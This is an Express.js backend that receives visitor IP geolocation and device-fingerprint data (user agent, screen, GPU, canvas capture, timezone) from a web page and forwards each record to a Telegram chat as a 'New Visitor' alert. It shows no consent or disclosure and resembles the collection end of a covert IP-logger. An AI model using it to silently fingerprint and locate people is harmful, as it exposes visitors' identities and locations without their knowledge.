const express = require('express');
const cors = require('cors');

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment variables.');
    process.exit(1);
}

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ----------------------------------------------
// Helper: send plain‑text message to Telegram
// with automatic length trimming
// ----------------------------------------------
async function sendTextMessage(text) {
    // Hard limit: Telegram allows max 4096 characters
    if (text.length > 4096) {
        text = text.substring(0, 4093) + '...';
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: text
            })
        });
        const result = await response.json();
        if (!result.ok) {
            console.error('❌ Telegram sendMessage failed:', result);
        }
    } catch (e) {
        console.error('sendTextMessage error:', e);
    }
}

// ----------------------------------------------
// Build a concise, safe message (max 4000 chars)
// ----------------------------------------------
function buildMessage(ipData, fingerprint) {
    let msg = '📡 New Visitor\n\n';

    // --- IP info (safe, short) ---
    if (ipData) {
        msg += `IP: ${ipData.ip || 'N/A'}\n`;
        if (ipData.city) msg += `City: ${ipData.city}\n`;
        if (ipData.region) msg += `Region: ${ipData.region}\n`;
        if (ipData.country_name) msg += `Country: ${ipData.country_name}\n`;
        if (ipData.org) msg += `ISP: ${ipData.org}\n`;
        msg += '\n';
    }

    // --- Device fingerprint (truncate long fields) ---
    if (fingerprint) {
        msg += '🖥️ Device:\n';
        const ua = (fingerprint.userAgent || '').substring(0, 100);
        msg += `User Agent: ${ua}\n`;
        msg += `Platform: ${fingerprint.platform || '?'}\n`;
        msg += `Screen: ${fingerprint.screen?.width || '?'}x${fingerprint.screen?.height || '?'}\n`;
        msg += `Cores: ${fingerprint.hardwareConcurrency || '?'}\n`;
        msg += `Memory: ${fingerprint.deviceMemory || '?'} GB\n`;
        msg += `Touch: ${fingerprint.maxTouchPoints || '?'}\n`;
        msg += `Timezone: ${fingerprint.timezone || '?'}\n`;

        // WebGL renderer can be long – limit to 80 chars
        if (fingerprint.webgl?.renderer) {
            const renderer = fingerprint.webgl.renderer.substring(0, 80);
            msg += `GPU: ${renderer}\n`;
        }

        // Canvas fingerprint: only say “captured” or “no”, never include the base64
        msg += `Canvas: ${fingerprint.canvas ? 'captured' : 'no'}\n`;
        msg += '\n';
    }

    msg += `🕒 Time: ${new Date().toISOString()}`;

    // Final safety cut (should already be short, but just in case)
    if (msg.length > 4000) {
        msg = msg.substring(0, 3997) + '...';
    }
    return msg;
}

// ----------------------------------------------
// Main endpoint
// ----------------------------------------------
app.post('/api/telegram', async (req, res) => {
    try {
        const { ipData, fingerprint, timestamp } = req.body;

        console.log(`[+] Received at ${timestamp || new Date().toISOString()}`);
        console.log(`[+] IP: ${ipData?.ip || 'unknown'}`);

        const message = buildMessage(ipData, fingerprint || null);
        await sendTextMessage(message);

        res.status(200).json({ success: true });
    } catch (error) {
        console.error('Error processing request:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Backend running on port ${PORT}`);
});
